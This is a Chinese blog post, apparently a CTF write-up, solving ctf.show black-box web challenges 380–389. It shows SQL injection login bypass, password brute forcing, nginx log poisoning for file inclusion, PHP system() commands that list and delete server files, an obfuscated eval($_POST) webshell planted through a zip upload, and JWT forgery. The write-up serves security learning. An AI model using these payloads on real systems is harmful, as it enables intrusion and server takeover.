@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctf-show-黑盒测试 | 忆 执 昔 来 的 旅 途</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="CTF" />
+  
+  
+  
+  
+  <meta name="description" content="一、黑盒测试1.1 Web 380扫目录可以发现   尝试 ?id&#x3D;2  可以看到是 file_get_contents  那 ?id&#x3D;flag 尝试 ，查源码得到 1.2 Web 381 可以看到这里与之前不同，但是尝试访问过后，依旧不行 那继续扫，发现，仍然得到了 page.php  123?id&#x3D;12 3 4# 发现对应的是每一篇报道  依次访问，最终无所获，且尝试过后 page_flag.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Show-黑盒测试">
+<meta property="og:url" content="https://xizhi-future.github.io/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
+<meta property="og:description" content="一、黑盒测试1.1 Web 380扫目录可以发现   尝试 ?id&#x3D;2  可以看到是 file_get_contents  那 ?id&#x3D;flag 尝试 ，查源码得到 1.2 Web 381 可以看到这里与之前不同，但是尝试访问过后，依旧不行 那继续扫，发现，仍然得到了 page.php  123?id&#x3D;12 3 4# 发现对应的是每一篇报道  依次访问，最终无所获，且尝试过后 page_flag.">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png">
+<meta property="og:image" content="c:/Users/yinanping/AppData/Roaming/Typora/typora-user-images/image-20210804135637994.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png">
+<meta property="article:published_time" content="2021-11-19T07:14:09.000Z">
+<meta property="article:modified_time" content="2021-11-19T07:15:45.222Z">
+<meta property="article:author" content="xizhi-future">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png">
+  
+    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/playist">音乐</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-CTF-Show-黑盒测试" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      CTF-Show-黑盒测试
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/11/19/CTF-Show-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" class="article-date">
+	  <time datetime="2021-11-19T07:14:09.000Z" itemprop="datePublished">2021-11-19</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/CTF-Show/">CTF Show</a>
+
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="一、黑盒测试"><a href="#一、黑盒测试" class="headerlink" title="一、黑盒测试"></a>一、黑盒测试</h1><h2 id="1-1-Web-380"><a href="#1-1-Web-380" class="headerlink" title="1.1 Web 380"></a>1.1 Web 380</h2><p>扫目录可以发现</p>
+<p><img src="https://i.loli.net/2021/08/04/oQUxOMAecNVramB.png" alt="image-20210804135546210"></p>
+<p><img src="https://i.loli.net/2021/08/04/PHiK79wfyUxTWGe.png" alt="image-20210804135326954"></p>
+<p>尝试 ?id=2</p>
+<p><img src="https://i.loli.net/2021/08/04/pgPURTNBjht75o6.png" alt="image-20210804135348176"></p>
+<p>可以看到是 <code>file_get_contents</code> </p>
+<p>那 <code>?id=flag</code> 尝试 ，查源码得到</p>
+<h2 id="1-2-Web-381"><a href="#1-2-Web-381" class="headerlink" title="1.2 Web 381"></a>1.2 Web 381</h2><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210804135637994.png" alt="image-20210804135637994"></p>
+<p>可以看到这里与之前不同，但是尝试访问过后，依旧不行</p>
+<p>那继续扫，发现，仍然得到了 <code>page.php</code></p>
+<p><img src="https://i.loli.net/2021/08/04/lC5HYPfB4xVj9DE.png" alt="image-20210804140001237"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br><span class="line">2 3 4</span><br><span class="line"><span class="comment"># 发现对应的是每一篇报道</span></span><br></pre></td></tr></table></figure>
+
+<p>依次访问，最终无所获，且尝试过后 <code>page_flag.php</code> 应该也是不存在的</p>
+<p>又回到最初发现的原密码目录，再次尝试，成功</p>
+<p><img src="https://i.loli.net/2021/08/04/SrIFG9wsRJ6mzAQ.png" alt="image-20210804140511148"></p>
+<h2 id="1-3-Web-382-383"><a href="#1-3-Web-382-383" class="headerlink" title="1.3 Web 382-383"></a>1.3 Web 382-383</h2><p>这次再直接访问过后，就是登录页面</p>
+<p><img src="https://i.loli.net/2021/08/04/u5OVsHQIXcv7lBe.png" alt="image-20210804140652142"></p>
+<p><strong>SQL 万能密码</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username: admin<span class="string">&#x27;or&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/JTAzCBqfjY9sahW.png" alt="image-20210804140903548"></p>
+<p><strong>密码爆破</strong></p>
+<p><img src="https://i.loli.net/2021/08/04/DW685jRtagGKIeb.png" alt="image-20210804141939521"></p>
+<h2 id="1-4-Web-384"><a href="#1-4-Web-384" class="headerlink" title="1.4 Web 384"></a>1.4 Web 384</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密码前2位是小写字母，后三位是数字</span><br></pre></td></tr></table></figure>
+
+<p>万能密码不可行，只能根据题目进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">		<span class="built_in">print</span>(i,j)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/GK4kNicyxXmhBvV.png" alt="image-20210804144019115"></p>
+<h2 id="1-5-Web-385"><a href="#1-5-Web-385" class="headerlink" title="1.5 Web 385"></a>1.5 Web 385</h2><p>同样有后台登录，但是密码也没有提示，我们先不进行爆破</p>
+<p>扫目录，有新的发现</p>
+<p><img src="https://i.loli.net/2021/08/04/TtuqMYQVP65XOe9.png" alt="image-20210804144556248"></p>
+<p><img src="https://i.loli.net/2021/08/04/qeb5Y4MXhUW29KP.png" alt="image-20210804144644455"></p>
+<p><img src="https://i.loli.net/2021/08/04/sGpZi9luOXMehTP.png" alt="image-20210804144714402"></p>
+<p>证明我们已经重置了密码，那么 所谓的 默认密码是多少呢？</p>
+<p>不管是多少，肯定是弱密码，我们可以再进行爆破，也可以结合之前所爆破出来的密码尝试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin888</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-6-Web-386"><a href="#1-6-Web-386" class="headerlink" title="1.6 Web 386"></a>1.6 Web 386</h2><p>说是扫出来的 <code>clear.php</code> ，但是我 dirsearch 没有扫出来，说白了，还是字典不够强大</p>
+<p><img src="https://i.loli.net/2021/08/04/XCiA4ofnjSg5YJM.png" alt="image-20210804145328318"></p>
+<p>也就是说，我们需要首先清除掉 <code>lock.dat</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/clear.php?file=./install/lock.dat</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/FOypT7ZMeIN8i9U.png" alt="image-20210804150138828"></p>
+<p>清理成功之后再次像上一关那样就好了</p>
+<h2 id="1-7-Web-387"><a href="#1-7-Web-387" class="headerlink" title="1.7 Web 387"></a>1.7 Web 387</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前面部分和386一样</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/jeDxClWqETONUgm.png" alt="image-20210804150816749"></p>
+<p>说是和上一关一样，但是这次删不了，我们继续扫目录</p>
+<p><img src="https://i.loli.net/2021/08/04/BS9COfTgGrAX2wY.png" alt="image-20210804150803918"></p>
+<p><img src="https://i.loli.net/2021/08/04/gkam7jJ3xovDQ4Y.png" alt="image-20210804150901657"></p>
+<p><img src="https://i.loli.net/2021/08/04/Ev3jVune7N5tgOb.png" alt="image-20210804150936797"></p>
+<p>看来 robots.txt 也是用来提示我们 <code>/debug/</code> 的</p>
+<p>尝试传递参数试试</p>
+<p><img src="https://i.loli.net/2021/08/04/p4wzKtHeGEb8SuI.png" alt="image-20210804151150834"></p>
+<p><img src="https://i.loli.net/2021/08/04/jRNg9zqTElSA6iP.png" alt="image-20210804151227962"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line">?file=/flag</span><br><span class="line"><span class="comment">#等等都查不出来</span></span><br></pre></td></tr></table></figure>
+
+<p>那么，进行日志包含</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>然后抓包修改，写入命令</p>
+<p><img src="https://i.loli.net/2021/08/04/JEI8PWZ9qznGy4o.png" alt="image-20210804151954242"></p>
+<p>只在当前页面发现了一个 <code>index.php</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2021-01-09 15:26:15</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-01-09 15:30:48</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$html</span> = shell_exec(<span class="string">&#x27;php -f &#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	<span class="built_in">echo</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;file not exist&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;ls /var/www/html/&#x27;</span>);</span><br><span class="line">alsckdfy</span><br><span class="line">clear.php</span><br><span class="line">debug</span><br><span class="line">index.php</span><br><span class="line">install</span><br><span class="line">layui</span><br><span class="line">page.php</span><br><span class="line">page_1.php</span><br><span class="line">page_2.php</span><br><span class="line">page_3.php</span><br><span class="line">page_4.php</span><br><span class="line">robots.txt</span><br><span class="line"></span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>看样子没有 flag</p>
+<p>那么根据之前的思路，我们只要把 <code>lock.dat</code>  删掉，那么就可以重置管理员密码，就能够成功登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;rm ../install/lock.dat&#x27;</span>); ?&gt;</span><br><span class="line">然后我们可以再进行验证一下</span><br><span class="line">&lt;?php system(<span class="string">&#x27;ls ../install/&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此时再访问 <code>install</code> ，已经变成</p>
+<p><img src="https://i.loli.net/2021/08/04/SmO1ys82bwBzTiv.png" alt="image-20210804153001982"></p>
+<p><img src="https://i.loli.net/2021/08/04/bWPpJf9c34qQKSV.png" alt="image-20210804153015432"></p>
+<p>然后进入后台登陆即可 <code>admin888</code></p>
+<p>最后才想到，flag 应该是出现在 登陆成功之后的页面里的，也就是 <code>/alsckdfy/check.php</code> ，所以我们也完全可以 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(<span class="string">&#x27;cat ../alsckdfy/check.php&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即可查到</p>
+<p><img src="https://i.loli.net/2021/08/04/NteX42lnw3yVIoT.png" alt="image-20210804153236220"></p>
+<h2 id="1-8-Web-388"><a href="#1-8-Web-388" class="headerlink" title="1.8 Web 388"></a>1.8 Web 388</h2><p>按照之前的思路来</p>
+<p><img src="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png" alt="image-20210804154217200"></p>
+<p>看了其它大神的解，发现在后台还有 <code>/editor/</code> 目录，一扫，果然</p>
+<p><img src="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png" alt="image-20210804160121313"></p>
+<p>那么就一定存在文件上传的问题</p>
+<ul>
+<li><code>alsckdfy/editor</code> 文件上传</li>
+<li><code>/debug?file=</code> 进行文件包含，写入 <code>.php</code> 文件</li>
+<li>访问 <code>.php</code> 文件，进行命令执行</li>
+</ul>
+<p><img src="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png" alt="image-20210804160641858"></p>
+<p>我想着写完之后提交，居然还未开放，那就只好 上传文件了</p>
+<p><img src="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png" alt="image-20210804160753795"></p>
+<p>KindEditor 4.1.11 (2016-03-31)</p>
+<p>网上查找相关漏洞</p>
+<p><img src="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png" alt="image-20210804160912989"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 我尝试了一下</span></span><br><span class="line">/alsckdfy/editor/php/file_manager_json.php?path=/</span><br><span class="line"><span class="comment"># 居然不行</span></span><br></pre></td></tr></table></figure>
+
+<p>那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本地的 2.zip 免杀🐎</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1])&#x27;</span>.<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径 </span></span><br><span class="line"><span class="comment"># /alsckdfy/attached/file/20210804/20210804083008_10879.zip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png" alt="image-20210804162756748"></p>
+<p>可以看到有限制，我们可以上传 <code>.zip</code> 文件</p>
+<p><img src="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png" alt="image-20210804161941726"></p>
+<p>然后包含，我们将它写到 网站根目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png" alt="image-20210804162134294"></p>
+<p><img src="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png" alt="image-20210804163113755"></p>
+<p>可以看到，上传成功</p>
+<p>直接命令执行，查看源码得到</p>
+<p><img src="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png" alt="image-20210804163322989"></p>
+<h2 id="1-9-Web-389"><a href="#1-9-Web-389" class="headerlink" title="1.9 Web 389"></a>1.9 Web 389</h2><p>按照上面思路</p>
+<p><img src="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png" alt="image-20210804164040896"></p>
+<p>权限不足，找 cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs</span><br></pre></td></tr></table></figure>
+
+<p>jwt 在线 解密 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p><img src="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png" alt="image-20210804164905283"></p>
+<p>然后我们修改为 admin</p>
+<p><img src="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png" alt="image-20210804165033210"></p>
+<p>更改之后刷新，回到上一关</p>
+<p><img src="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png" alt="image-20210804165212640"></p>
+<p><a target="_blank" rel="noopener" href="http://4563dd47-a66b-4309-9e15-183bb065ff68.challenge.ctf.show:8080/alsckdfy/attached/file/20210804/20210804085256_19145.zip">/alsckdfy/attached/file/20210804/20210804085256_19145.zip</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div id="donation_div"></div>
+
+
+<script src="/js/vdonate.js"></script>
+
+<script>
+var a = new Donate({
+  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
+  btnText: 'Donate', // 可选参数，打赏按钮文字
+  el: document.getElementById('donation_div'),
+  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
+  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
+});
+</script>
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>xizhi-future</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/11/19/CTF-Show-黑盒测试/" target="_blank" title="CTF-Show-黑盒测试">https://xizhi-future.github.io/2021/11/19/CTF-Show-黑盒测试/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
